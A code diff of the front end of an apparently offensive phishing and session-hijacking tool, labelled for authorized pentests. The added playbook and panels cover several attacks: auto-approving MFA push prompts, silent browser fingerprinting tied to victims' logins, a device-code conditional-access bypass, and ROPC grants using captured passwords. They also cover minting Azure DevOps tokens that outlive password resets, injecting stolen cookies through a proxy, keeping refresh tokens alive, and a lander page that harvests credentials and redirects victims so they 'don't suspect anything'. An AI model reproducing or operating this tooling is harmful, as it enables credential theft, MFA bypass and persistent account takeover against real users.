     <tr><td><code>-L 8091:localhost:8091</code></td><td>remote → laptop</td><td>Remote-browser UI</td></tr>
     <tr><td><code>-L 8092:localhost:8092</code></td><td>remote → laptop</td><td>This debug dashboard</td></tr>
@@ -4914,7 +5199,7 @@ curl -sI http://127.0.0.1:8080/</pre>
     <tr><td><code>rag_engagement_id</code></td><td>Optional engagement UUID to attach findings to.</td></tr>
   </table>
 
-  <h2>Reverse Proxy (transparent MITM)</h2>
+  <h2>Reverse Proxy (transparent BITM)</h2>
   <p><b>Authorized pentest / red-team use only.</b> Port <code>8085</code> runs a multi-tenant reverse proxy that transparently forwards to arbitrary target sites. Every req/resp is captured to the Flow Trace tab under a synthetic session <code>revproxy_&lt;hostname&gt;</code>.</p>
   <ol>
     <li>Open <a href="http://${host}:8085/" target="_blank" style="color:#7dd3fc">http://${host}:8085/</a>.</li>
@@ -4928,11 +5213,11 @@ curl -sI http://127.0.0.1:8080/</pre>
   <p>Start from the <b>Proxy</b> tab. Default port <code>3128</code>. Configure your tool (or browser) to use it:</p>
   <pre>curl -k -x http://${host}:3128 https://example.com</pre>
   <p>For HTTPS injection to work, trust the generated CA cert from <code>/data/proxy_ca/ca.crt</code>:</p>
-  <pre>docker exec mitm-proxy cat /data/proxy_ca/ca.crt</pre>
+  <pre>docker exec bitm-proxy cat /data/proxy_ca/ca.crt</pre>
 
   <h2>External credential ingest — POST /api/capture/external</h2>
-  <p><b>Authorized pentest use only.</b> Pentester-side tooling (Burp extension, a separate runner, anything that obtains credentials outside the <code>:3128</code> MITM path) can push them into the same credentials store + Slack capture channel as in-band auto-captures.</p>
-  <p><b>→ For complete setup guide, file locations, lander deployment, log formats, and troubleshooting, see <code>EXTERNAL_CAPTURE_SETUP.md</code> in the repo root.</b></p>
+  <p><b>Authorized pentest use only.</b> Pentester-side tooling (Burp extension, a separate runner, anything that obtains credentials outside the <code>:3128</code> BITM path) can push them into the same credentials store + Slack capture channel as in-band auto-captures.</p>
+  <p><b>→ For complete setup guide, file locations, lander deployment, log formats, and troubleshooting, see <code>docs/EXTERNAL_CAPTURE_SETUP.md</code> in the repo.</b></p>
   <p>Quick setup (in <b>Settings &rarr; Configuration &rarr; External capture</b>):</p>
   <ul>
     <li><code>external_capture_token</code> — bearer token required on every request. Empty disables the endpoint (returns 404). Also accepts <code>EXTERNAL_CAPTURE_TOKEN</code> env or <code>config/external_capture_token.txt</code>.</li>
@@ -4963,7 +5248,7 @@ curl -sI http://127.0.0.1:8080/</pre>
     <li><b>Cross-origin hosting</b> (separate believable domain): add the page's origin to <code>external_capture_cors_origins</code> (or set it to <code>*</code>), AND broaden <code>external_capture_allowed_ips</code> to include the source IP range that will POST (often <code>0.0.0.0/0</code>, since those IPs aren't predictable). Bearer token + Origin check are the real auth in this mode.</li>
     <li>Restyle the form to match the engagement pretext &mdash; the capture logic is style-agnostic.</li>
   </ol>
-  <div class="hint">The bearer token is embedded in page source for either variant. Use a single-purpose token and rotate it after the engagement. Per-field reference + UI mapping: <code>SESSIONS.md</code> &rarr; <b>External Capture</b>. Implementation: <code>backend/routes/capture.py</code>.</div>
+  <div class="hint">The bearer token is embedded in page source for either variant. Use a single-purpose token and rotate it after the engagement. Per-field reference + UI mapping: <code>docs/SESSIONS.md</code> &rarr; <b>External Capture</b>. Implementation: <code>backend/routes/capture.py</code>.</div>
 
   <h2>Environment / run</h2>
   <pre>./run.sh</pre>
@@ -4974,8 +5259,135 @@ curl -sI http://127.0.0.1:8080/</pre>
     <li><code>PORT</code>, <code>DEBUG_PORT</code>, <code>RAG_PORT</code> — override ports.</li>
     <li><code>CREDENTIAL_PASSPHRASE</code> — encrypt captured credentials at rest (AES-256-GCM).</li>
   </ul>
+
+  </div>
+
+  <div id="docs-pane-attacks" style="display:none">
+
+  <p style="color:#94a3b8">Step-by-step playbook for every attack/demo this tool can drive. Run these only against a tenant you're authorized to test — the lab deployment scopes the BITM proxy and Phantom Join to an allowlisted tenant via <code>proxy_allowed_hosts</code> / <code>phantom_join_allowed_domains</code> (see <code>docs/PROXY_DEEP_DIVE.md</code>, <code>tools/README_Phantom.md</code>); a self-hosted instance has no such restriction unless you configure one.</p>
+
+  <div class="attack-card">
+    <h3><a href="http://${host}:8091/" target="_blank" rel="noopener noreferrer">1. Push notification auto-click (Path A)</a><span class="portal-arrow">↗ session UI (:8091)</span></h3>
+    <p class="attack-goal">Goal: show that a CA policy allowing Microsoft Authenticator push, alongside a stronger method like a passkey, is only as strong as the weakest option — the tool auto-approves the push before the user even sees the picker.</p>
+    <ol>
+      <li>Open the main session UI (<code>:8091</code>, or <code>/tp8091/</code>/<code>/start</code> on the lab).</li>
+      <li>Start a session against the target login URL and sign in with the test account's username/password.</li>
+      <li>When the MFA method picker appears, watch the <b>All Logs</b> tab (<code>:8092</code>) — it auto-selects push notification if offered and clicks through, rather than waiting on a passkey/FIDO2 prompt.</li>
+      <li>Approve the push on the registered phone.</li>
+      <li>Confirm the session completes login — check <b>Flow Trace</b> for a <span class="flow-ms-badge tokens" style="padding:1px 6px">TOKENS</span> pill after the push exchange.</li>
+    </ol>
+  </div>
+
+  <div class="attack-card">
+    <h3><a href="http://${host}:8091/" target="_blank" rel="noopener noreferrer">2. Passkey dead-end detection</a><span class="portal-arrow">↗ session UI (:8091)</span></h3>
+    <p class="attack-goal">Goal: confirm the tool correctly recognizes when passkey/FIDO2 is the <i>only</i> method offered and stops rather than guessing — this is the negative case that proves push auto-click isn't just clicking blindly.</p>
+    <ol>
+      <li>Use (or configure) a test account whose CA policy/method registration only allows a passkey — no push, no SMS.</li>
+      <li>Start a session the same way as attack #1.</li>
+      <li>Watch <b>All Logs</b> for a dead-end message once the picker resolves to passkey-only.</li>
+      <li>Confirm no auto-click happens and no token is captured in <b>Flow Trace</b> — this is the expected, correct outcome, not a bug.</li>
+    </ol>
+  </div>
+
+  <div class="attack-card">
+    <h3><a href="http://${host}:8091/silent.html" target="_blank" rel="noopener noreferrer">3. Silent drive-by fingerprinting</a><span class="portal-arrow">↗ /silent page · results in Captured Data</span></h3>
+    <p class="attack-goal">Goal: capture a visitor's browser + device fingerprint with zero interaction and zero visible page content, then <b>tie it to their follow-on login</b> — the session replays the exact device you silently fingerprinted.</p>
+    <ol>
+      <li>Send the target to <code>/silent</code> (redirects to <code>silent.html</code>) — same-origin hosting under <code>:8091</code>, or the lab's public <code>/silent</code> alias.</li>
+      <li>The page renders nothing visible; it POSTs the fingerprint to <code>/api/capture/external</code> automatically on load, mints a correlation id (<code>cid</code>), and funnels the visitor onward to <code>/start?cid=…</code> (the hosted login session).</li>
+      <li>The session started that way builds a <b>device profile from the silent capture</b> and replays it (see the <code>CID_LINK</code> line in <b>All Logs</b>): the IdP sees the visitor's real UA / client hints / timezone, not the server's.</li>
+      <li>Confirm the tie: <b>Captured Data</b> shows the silent-fp entry with a <code>linked_device_id</code>, and the <b>Devices</b> tab (<code>:8092</code>) shows a "Silent capture …" profile tagged with the same <code>cid</code>. Any creds the session captures carry the same <code>cid</code>.</li>
+    </ol>
+  </div>
+
+  <div class="attack-card">
+    <h3><a href="#" onclick="return docsGoTab('phantom')">4. Phantom Join — device-code CA bypass (Path B)</a><span class="portal-arrow">→ Phantom tab</span></h3>
+    <p class="attack-goal">Goal: demonstrate that a CA policy scoped to interactive/browser sign-in can be sidestepped entirely via the device-code grant (RFC 8628) plus a phantom device registration — no passkey or push involved at all.</p>
+    <ol>
+      <li>Open the <b>Phantom</b> tab (<code>:8092</code>).</li>
+      <li>Fill in <b>Username (UPN)</b>, <b>Password</b>, and <b>Domain</b> for the authorized test tenant.</li>
+      <li>Leave <b>Dry run</b> checked first to preview every <code>roadtx</code>/<code>roadrecon</code> command without executing anything — review the log.</li>
+      <li>Uncheck <b>Dry run</b>, leave <b>Start phase</b> at 1 with no <b>Stop phase</b> cap, and click <b>▶ Run</b>.</li>
+      <li>Watch <code>phantom-phase</code> and the live log step through: DRS token (phase 1-2) → device registration (phase 3) → PRT mint + exchange (phase 4-5).</li>
+      <li>On completion, the findings panel shows the minted token/PRT claims — confirms CA was bypassed for a policy that only gated the interactive endpoint.</li>
+      <li><b>Cleanup:</b> delete the registered device from Entra admin center → Devices, and revoke the test account's sessions — the tool's own delete only removes the local cert copy.</li>
+    </ol>
+    <div class="hint">If <code>phantom_join_allowed_domains</code> is configured (lab deployments), a domain outside that list is rejected immediately with no subprocess spawned — worth demonstrating as the safety boundary, not just the attack.</div>
+  </div>
+
+  <div class="attack-card">
+    <h3><a href="#" onclick="return docsGoTab('creds')">5. ROPC legacy auth test</a><span class="portal-arrow">→ Captured Data tab</span></h3>
+    <p class="attack-goal">Goal: show that the resource-owner-password-credentials grant goes straight to <code>/oauth2/v2.0/token</code>, skipping the interactive authorization endpoint (and whatever CA enforcement only runs there).</p>
+    <ol>
+      <li>Open <b>Captured Data</b> tab, find the card for a site where credentials were captured.</li>
+      <li>Click <b>Test ROPC…</b> on that card.</li>
+      <li>The username/password fields auto-fill from the captured input (first email-like value = user, first non-email ≥4 chars = password) — verify or edit them, and set <b>Tenant</b> (use <code>organizations</code>, not <code>common</code>/<code>consumers</code> — those are rejected outright with <code>AADSTS9001023</code> before credentials are even evaluated).</li>
+      <li>Click Run — a 200 with an access token means the CA/MFA gap is real for this account; an <code>AADSTS50076</code>/<code>AADSTS53003</code>-class error means ROPC itself was blocked (the control is working as intended).</li>
+    </ol>
+  </div>
+
+  <div class="attack-card">
+    <h3><a href="#" onclick="return docsGoTab('creds')">6. Create an Azure DevOps PAT (persistence)</a><span class="portal-arrow">→ Captured Data tab</span></h3>
+    <p class="attack-goal">Goal: turn captured creds into a long-lived Azure DevOps Personal Access Token — durable credential material that survives the victim's password reset and usually sits outside the CA/MFA re-evaluation that gates interactive sign-in.</p>
+    <ol>
+      <li>Open <b>Captured Data</b> tab, find the card for a site where credentials were captured.</li>
+      <li>Click <b>Create ADO PAT…</b> on that card (directly below Test ROPC).</li>
+      <li>User/password auto-fill from captured input; set <b>Tenant</b> (<code>organizations</code> or a tenant GUID/domain). Leave <b>ADO org</b> blank to auto-discover the account's org(s), or name one.</li>
+      <li>Pick a <b>Scope</b> (<code>app_token</code> = full access, or a space-delimited list like <code>vso.code vso.build</code>), <b>Valid days</b>, and optionally <b>all orgs</b>. Click Create.</li>
+      <li>A blocked ROPC grant surfaces the <code>AADSTS</code> code as the finding (control working). A minted PAT is returned with a Copy button — this is a real, listable token in the target org.</li>
+      <li><b>Cleanup:</b> revoke the PAT from Azure DevOps → User settings → Personal access tokens (the panel shows its <code>authorizationId</code>).</li>
+    </ol>
+  </div>
+
+  <div class="attack-card">
+    <h3><a href="#" onclick="return docsGoTab('auth-proxy')">7. Credential injection via the auth proxy (:3128)</a><span class="portal-arrow">→ Proxy Traffic tab</span></h3>
+    <p class="attack-goal">Goal: replay a previously captured session's cookies/tokens transparently through the BITM proxy into new outbound requests — turning a one-time capture into ongoing access.</p>
+    <ol>
+      <li>Open the <b>Proxy</b> tab, click <b>Start Proxy</b>.</li>
+      <li>Point a client at the published port (default <code>3128</code>, any of <code>3100-3199</code>) with the proxy's CA cert trusted.</li>
+      <li>Browse to a host with an existing capture in <b>Captured Data</b> — watch <b>Proxy Traffic</b> for <code>INJECT</code>/<code>BITM_INJECT</code> entries showing the stored cookies/headers being merged into the live request.</li>
+      <li>Confirm the site treats the request as already-authenticated (no login prompt) in the browser driving through the proxy.</li>
+    </ol>
+  </div>
+
+  <div class="attack-card">
+    <h3><a href="#" onclick="return docsGoTab('keepalive-log')">8. Token keepalive / persistence</a><span class="portal-arrow">→ Keep-Alive tab</span></h3>
+    <p class="attack-goal">Goal: show a captured refresh token being silently exercised on a schedule to stay valid well past normal expiry, without re-triggering CA/MFA.</p>
+    <ol>
+      <li>Open the <b>Keep-Alive</b> tab and enable keepalive for a captured session (Settings → Keep-Alive subtab has the interval).</li>
+      <li>Watch the Keep-Alive log for periodic refresh entries.</li>
+      <li>Revisit the site hours later using the same captured session/cookies — it should still be authenticated.</li>
+    </ol>
+  </div>
+
+  <div class="attack-card">
+    <h3><a href="http://${host}:8091/lander.html" target="_blank" rel="noopener noreferrer">9. Lander credential-capture page</a><span class="portal-arrow">↗ /lander page · results in Captured Data</span></h3>
+    <p class="attack-goal">Goal: a believable-looking login page that harvests submitted credentials directly via <code>POST /api/capture/external</code>, for pretexting scenarios where driving a real browser session isn't the goal.</p>
+    <ol>
+      <li>Send the target to <code>/lander</code> (redirects to <code>lander.html</code>) — same-origin under <code>:8091</code>, or the lab's public <code>/lander</code> alias.</li>
+      <li>Whatever is submitted posts to <code>/api/capture/external</code> and the page then redirects on to <code>next_url</code> (defaults to the real <code>default_login_url</code>) so the target lands on a real, working sign-in page and doesn't suspect anything.</li>
+      <li>Check <b>Captured Data</b> for the new entry with the submitted username/password.</li>
+    </ol>
+    <div class="hint">Never enter real production credentials on this page during a demo — see <code>docs/EXTERNAL_CAPTURE_SETUP.md</code> for cross-origin hosting and token rotation guidance.</div>
+  </div>
+
+  </div>
   `;
   document.getElementById('docs-content').innerHTML=html;
+}
+
+function switchDocsPane(name){
+  document.querySelectorAll('.docs-subtab-btn').forEach(b=>b.classList.toggle('active', b.dataset.docsPane===name));
+  const ref=document.getElementById('docs-pane-reference'), atk=document.getElementById('docs-pane-attacks');
+  if(ref) ref.style.display = name==='reference' ? '' : 'none';
+  if(atk) atk.style.display = name==='attacks' ? '' : 'none';
+}
+// "Follow the link over to where it is in the portal" — the Test Attacks
+// card titles call this to jump straight to the dashboard tab that hosts
+// the attack. Returns false so the anchor's href="#" doesn't scroll.
+function docsGoTab(tab){
+  try{switchTab(tab)}catch(_){}
+  return false;
 }
 
 // ── Config ──
@@ -5006,7 +5418,7 @@ const PERF_POOL_KEYS=['workers_enabled','worker_count','worker_sessions_max'];
 const CATEGORIZED_KEYS=new Set([...BROWSER_KEYS,...LOGGING_KEYS,...SLACK_KEYS,...FINGERPRINT_KEYS,...KEEPALIVE_KEYS]);
 function _cfgRowHtml(k,v){
   const label=k.replace(/_/g,' ');
-  if(k==='browser_type')return `<div class="config-row"><label>${label}</label><select class="cfg-input" style="width:auto" onchange="cfgSet('${k}',this.value)"><option value="edge"${v==='edge'?' selected':''}>Edge (emulated)</option><option value="edge-real"${v==='edge-real'?' selected':''}>Edge (real)</option><option value="chrome"${v==='chrome'?' selected':''}>Chrome</option></select></div>`;
+  if(k==='browser_type')return `<div class="config-row"><label>${label}</label><select class="cfg-input" style="width:auto" onchange="cfgSet('${k}',this.value)"><option value="edge"${v==='edge'?' selected':''}>Edge (emulated)</option><option value="edge-real"${v==='edge-real'?' selected':''}>Edge (real)</option><option value="chrome"${v==='chrome'?' selected':''}>Chrome</option><option value="firefox"${v==='firefox'?' selected':''}>Firefox</option></select></div>`;
   if(k==='browser_chrome')return `<div class="config-row"><label>${label}</label><select class="cfg-input" style="width:auto" onchange="cfgSet('${k}',this.value)"><option value="full"${v==='full'?' selected':''}>Full (address bar + controls)</option><option value="minimal"${v==='minimal'?' selected':''}>Minimal (paste/capture/close only)</option><option value="none"${v==='none'?' selected':''}>None (primary window only)</option></select></div>`;
   if(k==='mobile_emulation')return `<div class="config-row"><label>${label}</label><select class="cfg-input" style="width:auto" onchange="cfgSet('${k}',this.value)"><option value="off"${v==='off'?' selected':''}>Off (Desktop)</option><option value="phone_android"${v==='phone_android'?' selected':''}>Phone — Android (Pixel 8)</option><option value="phone_ios"${v==='phone_ios'?' selected':''}>Phone — iOS (iPhone 15)</option><option value="tablet_android"${v==='tablet_android'?' selected':''}>Tablet — Android</option><option value="tablet_android_edge"${v==='tablet_android_edge'?' selected':''}>Tablet — Android + Edge</option><option value="tablet_ios"${v==='tablet_ios'?' selected':''}>Tablet — iOS</option><option value="tablet_ios_edge"${v==='tablet_ios_edge'?' selected':''}>Tablet — iOS + Edge</option></select></div>`;
   if(typeof v==='boolean')return `<div class="config-row"><label>${label}</label><label class="toggle"><input type="checkbox" ${v?'checked':''} onchange="cfgSet('${k}',this.checked)"><span class="sl"></span></label></div>`;
@@ -5025,7 +5437,7 @@ function _renderKeysInto(elId, keys, notes){
 }
 function renderBrowserConfig(){
   _renderKeysInto('browser-cfg',BROWSER_KEYS,{
-    browser_type:'<b>edge</b> = Chromium with Edge UA (no msedge install needed). <b>edge-real</b> = native Microsoft Edge (requires edge install; unsupported on arm64 Linux). <b>chrome</b> = Chromium with Chrome UA.',
+    browser_type:'<b>edge</b> = Chromium with Edge UA (no msedge install needed). <b>edge-real</b> = native Microsoft Edge (requires edge install; unsupported on arm64 Linux). <b>chrome</b> = Chromium with Chrome UA. <b>firefox</b> = native Firefox engine (real Gecko, not a UA spoof — works on arm64 Linux, unlike edge-real).',
     browser_chrome:'Controls the :8091 viewer chrome. <b>full</b> shows the back/forward/reload/URL input + action buttons. <b>minimal</b> hides navigation but keeps paste/capture/close. <b>none</b> drops the entire bar so only the primary browser window is visible. A <code>?chrome=full|minimal|none</code> URL param overrides this per-session.',
     private_mode:'Open each Playwright session in an incognito context (no persisted cookies between sessions).',
     mobile_emulation:'Emulate a mobile device viewport + user agent.',
@@ -5352,7 +5764,7 @@ function _cfgSectionBody(){
 function _cfgRowFor(k,v){
   const row=document.createElement('div');row.className='config-row';
   const label = k==='prefer_push' ? 'prefer push when password auth is not allowed' : k.replace(/_/g,' ');
-  if(k==='browser_type'){row.innerHTML=`<label>${label}</label><select class="cfg-input" style="width:auto" onchange="cfgSet('${k}',this.value)"><option value="edge"${v==='edge'?' selected':''}>Edge (emulated)</option><option value="edge-real"${v==='edge-real'?' selected':''}>Edge (real)</option><option value="chrome"${v==='chrome'?' selected':''}>Chrome</option></select>`}
+  if(k==='browser_type'){row.innerHTML=`<label>${label}</label><select class="cfg-input" style="width:auto" onchange="cfgSet('${k}',this.value)"><option value="edge"${v==='edge'?' selected':''}>Edge (emulated)</option><option value="edge-real"${v==='edge-real'?' selected':''}>Edge (real)</option><option value="chrome"${v==='chrome'?' selected':''}>Chrome</option><option value="firefox"${v==='firefox'?' selected':''}>Firefox</option></select>`}
   else if(k==='mobile_emulation'){row.innerHTML=`<label>${label}</label><select class="cfg-input" style="width:auto" onchange="cfgSet('${k}',this.value)"><option value="off"${v==='off'?' selected':''}>Off (Desktop)</option><option value="phone_android"${v==='phone_android'?' selected':''}>Phone — Android (Pixel 8)</option><option value="phone_ios"${v==='phone_ios'?' selected':''}>Phone — iOS (iPhone 15)</option><option value="tablet_android"${v==='tablet_android'?' selected':''}>Tablet — Android (Galaxy Tab S8)</option><option value="tablet_android_edge"${v==='tablet_android_edge'?' selected':''}>Tablet — Android + Edge (Galaxy Tab S8)</option><option value="tablet_ios"${v==='tablet_ios'?' selected':''}>Tablet — iOS (iPad Air)</option><option value="tablet_ios_edge"${v==='tablet_ios_edge'?' selected':''}>Tablet — iOS + Edge (iPad Air)</option></select>`}
   else if(k==='default_device_id'){
     const safe=esc(v||'');
@@ -5666,7 +6078,7 @@ function cfgSet(k,v){
 // Settings tab. After this change it's essentially a flush-everything.
 function saveConfig(){send({cmd:'update_config',data:configCache})}
 function clearAllSensitive(){if(!confirm('Delete ALL credentials, cookies, screenshots, and saved email?'))return;send({cmd:'clear_all_sensitive'})}
-function launchMitmProxy(priv){const _ak=new URLSearchParams(location.search).get('api_key')||'';const q=(priv?'auto=1&private=1':'auto=1')+(_ak?'&api_key='+_ak:'');const mainUrl=location.protocol+'//'+location.hostname+':8091';window.open(mainUrl+'/'+('?'+q),'_blank','popup,width=500,height=960')}
+function launchBitmProxy(priv){const _ak=new URLSearchParams(location.search).get('api_key')||'';const q=(priv?'auto=1&private=1':'auto=1')+(_ak?'&api_key='+_ak:'');const mainUrl=location.protocol+'//'+location.hostname+':8091';window.open(mainUrl+'/'+('?'+q),'_blank','popup,width=500,height=960')}
 
 // ── Generate capture link ──
 function _buildCaptureLink(target){
@@ -6023,7 +6435,7 @@ async function uploadCa(){
       ? data.warnings.map(w=>`<div style="color:#fef08a">⚠ ${esc(w)}</div>`).join('')
       : '';
     result.innerHTML=`<div style="color:#a7f3d0;background:#064e3b;border-left:3px solid #10b981;padding:6px 10px;border-radius:0 3px 3px 0">
-      <b>✓ CA replaced.</b> Subsequent connections will be MITM'd by the new pair. Existing host-leaf cert cache cleared.
+      <b>✓ CA replaced.</b> Subsequent connections will be BITM'd by the new pair. Existing host-leaf cert cache cleared.
       ${warn}
     </div>`;
     refreshCaInfo();
@@ -6036,7 +6448,7 @@ async function uploadCa(){
 function downloadCa(){
   const url='/api/browser/auth_proxy/ca/download'+(_apiKey?('?api_key='+encodeURIComponent(_apiKey)):'');
   const a=document.createElement('a');
-  a.href=url; a.download='mitm-proxy-ca.crt';
+  a.href=url; a.download='bitm-proxy-ca.crt';
   document.body.appendChild(a); a.click(); a.remove();
 }
 async function resetCa(){
@@ -6428,9 +6840,9 @@ function renderAuthProxy(){
   }
   if(authProxyStatus.ca_cert_path){
     caPath.textContent=authProxyStatus.ca_cert_path;
-    if(authProxyStatus.mitm_enabled){
+    if(authProxyStatus.bitm_enabled){
       caEl.style.display='';
-      caEl.innerHTML=`<span style="color:#4ade80">&#10003;</span> MITM enabled — HTTPS cookie/token injection active`;
+      caEl.innerHTML=`<span style="color:#4ade80">&#10003;</span> BITM enabled — HTTPS cookie/token injection active`;
     }else{
       caEl.style.display='';
       caEl.innerHTML=`<span style="color:#fbbf24">&#9888;</span> HTTP-only mode — install <code>cryptography</code> for HTTPS injection`;
@@ -6492,27 +6904,45 @@ function exportCred(siteId){
   a.click();
   setTimeout(()=>URL.revokeObjectURL(a.href),2000);
 }
-// Get-AAATokenFromAzLogin PowerShell snippet for the Captured Data
-// card. Pulls user/password from `captured_inputs` heuristically:
-// first input that looks like an email is the user, first non-email
-// input ≥4 chars is the password. Tenant id comes from
-// `default_tenant_id` config (Settings → Configuration). Display
-// respects `mask_captured_input` for the password but the copy
-// button always writes the unmasked command — masking exists to
-// protect over-the-shoulder display, not to gate operator-driven
-// copy actions.
-function renderAaaTokenSnippet(d,siteId){
-  // Handle both array (new format) and object (old format) for captured_inputs
-  let inputsArray = Array.isArray(d.captured_inputs) ? d.captured_inputs :
-                    (typeof d.captured_inputs === 'object' && d.captured_inputs ? Object.values(d.captured_inputs) : []);
+// Shared user/password heuristic for the Captured Data card — used by
+// both Get-AAATokenFromAzLogin and Test ROPC so the two features guess
+// identically. First input that looks like an email is the user, first
+// non-email input ≥4 chars is the password. captured_inputs is empty for
+// flows that never went through DOM input observation (device-code,
+// error-page bounces, programmatic auth) — falls back to d.user_id,
+// the email the auth-completion path stamps from JWT claims/form events.
+function guessUserPass(d){
+  const inputsArray = Array.isArray(d.captured_inputs) ? d.captured_inputs :
+                      (typeof d.captured_inputs === 'object' && d.captured_inputs ? Object.values(d.captured_inputs) : []);
   const inputs = inputsArray.filter(v=>typeof v==='string'&&v.length);
-  // captured_inputs is empty for flows that never went through DOM input
-  // observation (device-code, error-page bounces, programmatic auth). Fall
-  // back to d.user_id — that's the email the auth-completion path stamps
-  // onto the credential record from JWT claims / form events / etc.
   const userIdFallback=(typeof d.user_id==='string'?d.user_id.trim():'');
-  const guessUser=inputs.find(v=>/@[^@\s]+\.[^@\s]+/.test(v))||userIdFallback||'';
-  const guessPass=inputs.find(v=>v&&!/@/.test(v)&&v.length>=4)||'';
+  const emailAnywhere=/@[^@\s]+\.[^@\s]+/;
+  // capture.py joins external/lander captures into a single "user:pass"
+  // string, whereas in-band DOM capture stores each field as its own
+  // entry. Recognise the combined shape (email before the first colon,
+  // non-empty after) so ROPC/AAA pre-fill the password for those flows
+  // too — the split is what "populate the password from that session if
+  // captured" needs, since the password otherwise hides inside the pair.
+  const combinedIdx=v=>{const i=v.indexOf(':');return (i>0 && emailAnywhere.test(v.slice(0,i)) && v.slice(i+1).length)?i:-1;};
+  let guessUser='', guessPass='';
+  for(const v of inputs){
+    const i=combinedIdx(v);
+    if(i>=0){ guessUser=v.slice(0,i); guessPass=v.slice(i+1); break; }
+  }
+  // Fall back to separate entries (in-band DOM capture), skipping any
+  // combined "user:pass" string so it isn't mistaken for either field.
+  if(!guessUser) guessUser=inputs.find(v=>emailAnywhere.test(v)&&combinedIdx(v)<0)||userIdFallback||'';
+  if(!guessPass) guessPass=inputs.find(v=>v&&!emailAnywhere.test(v)&&combinedIdx(v)<0&&v.length>=4)||'';
+  return {guessUser,guessPass};
+}
+// Get-AAATokenFromAzLogin PowerShell snippet for the Captured Data
+// card. Tenant id comes from `default_tenant_id` config (Settings →
+// Configuration). Display respects `mask_captured_input` for the
+// password but the copy button always writes the unmasked command —
+// masking exists to protect over-the-shoulder display, not to gate
+// operator-driven copy actions.
+function renderAaaTokenSnippet(d,siteId){
+  const {guessUser,guessPass}=guessUserPass(d);
   const tid=(configCache.default_tenant_id||'').trim();
   const dispUser=guessUser||'<USER>';
   const dispPass=guessPass
@@ -6563,6 +6993,98 @@ function renderAaaTokenSnippet(d,siteId){
         Spawns pwsh with Connect-AzAccount → Get-AzAccessToken. Token is appended to <code>tokens[]</code> on this credential record so the AAA runner can use it. Requires <code>Az.Accounts</code> module.
       </div>
       <div id="aaa-login-result-${siteId}" style="font-size:13px"></div>
+    </div>
+  </div>`;
+}
+// ROPC (Resource Owner Password Credentials, RFC 6749 §4.3) test panel —
+// POSTs username+password straight to the tenant's /token endpoint via
+// POST /api/test-ropc, bypassing the interactive authorization endpoint
+// entirely. Same guessUserPass() heuristic as the AAA snippet above, so
+// the two features pre-fill identically. The AADSTS error code on
+// failure is itself the finding (e.g. AADSTS50076 = CA/MFA actually
+// blocked the legacy grant — policy working; a 200 on an MFA-required
+// account means ROPC is an uncovered bypass path).
+function renderRopcPanel(d,siteId){
+  const {guessUser,guessPass}=guessUserPass(d);
+  const tid=(configCache.default_tenant_id||'').trim();
+  return `<div style="margin-top:10px;padding-top:8px;border-top:1px solid #333">
+    <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
+      <button class="btn" style="padding:2px 10px;font-size:12px;background:#3f1d1d;border-color:#7f1d1d;color:#fecaca"
+              onclick="ropcToggle('${siteId}')"
+              title="POST username+password directly to /oauth2/v2.0/token (ROPC grant) — bypasses the interactive authorization endpoint">Test ROPC…</button>
+    </div>
+    <div id="ropc-${siteId}" style="display:none;margin-top:8px;background:#0a0a14;padding:10px;border-radius:4px;border:1px solid #3f1d1d">
+      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
+        <label style="color:#94a3b8;font-size:13px;min-width:64px">User</label>
+        <input id="ropc-user-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="${esc(guessUser)}">
+      </div>
+      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
+        <label style="color:#94a3b8;font-size:13px;min-width:64px">Password</label>
+        <input id="ropc-pass-${siteId}" type="password" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" placeholder="paste — never logged" value="${esc(guessPass||'')}">
+      </div>
+      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
+        <label style="color:#94a3b8;font-size:13px;min-width:64px">Tenant</label>
+        <input id="ropc-tid-${siteId}" class="cfg-input" style="flex:1;min-width:180px;font-size:13px" value="${esc(tid)}" placeholder="organizations, or a tenant GUID/domain — NOT common/consumers" title="Confirmed live: common/consumers reject the password grant outright with AADSTS9001023, before credentials are even checked">
+        <label style="color:#94a3b8;font-size:13px;min-width:64px;margin-left:6px">Client ID</label>
+        <input id="ropc-cid-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="29d9ed98-a469-4536-ade2-f981bc1d605e" title="Microsoft Authentication Broker — well-known public client, no app registration needed">
+        <button class="btn" style="padding:3px 12px;font-size:13px;background:#7f1d1d;border-color:#991b1b;color:#fecaca" onclick="ropcRun('${siteId}')">▶ Run</button>
+      </div>
+      <div style="color:#78859b;font-size:11px;margin-bottom:6px">
+        grant_type=password against https://login.microsoftonline.com/&lt;tenant&gt;/oauth2/v2.0/token.
+        Tenant must be "organizations" or a specific tenant, never common/consumers (AADSTS9001023).
+        Creates a real Azure AD sign-in log entry (legacy/non-interactive grant — distinctly flagged).
+      </div>
+      <div id="ropc-result-${siteId}" style="font-size:13px"></div>
+    </div>
+  </div>`;
+}
+// Azure DevOps PAT minting panel — POSTs captured creds to
+// /api/create-ado-pat, which ROPC-grants an ADO-resource token (confirmed
+// live: the Azure CLI public client carries the needed delegated
+// permission), discovers the account's ADO org(s), and creates a
+// long-lived PAT via the PAT Lifecycle API. Same guessUserPass() pre-fill
+// as ROPC/AAA. The PAT is durable credential material that survives the
+// victim's password reset and is usually outside CA/MFA re-evaluation —
+// framed as a finding, not a utility.
+function renderAdoPatPanel(d,siteId){
+  const {guessUser,guessPass}=guessUserPass(d);
+  const tid=(configCache.default_tenant_id||'').trim();
+  return `<div style="margin-top:10px;padding-top:8px;border-top:1px solid #333">
+    <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
+      <button class="btn" style="padding:2px 10px;font-size:12px;background:#3f1d1d;border-color:#7f1d1d;color:#fecaca"
+              onclick="adoPatToggle('${siteId}')"
+              title="ROPC to an Azure DevOps token, then mint a long-lived Personal Access Token — persistence that outlives password resets and is usually outside CA/MFA">Create ADO PAT…</button>
+    </div>
+    <div id="adopat-${siteId}" style="display:none;margin-top:8px;background:#0a0a14;padding:10px;border-radius:4px;border:1px solid #3f1d1d">
+      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
+        <label style="color:#94a3b8;font-size:13px;min-width:64px">User</label>
+        <input id="adopat-user-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="${esc(guessUser)}">
+      </div>
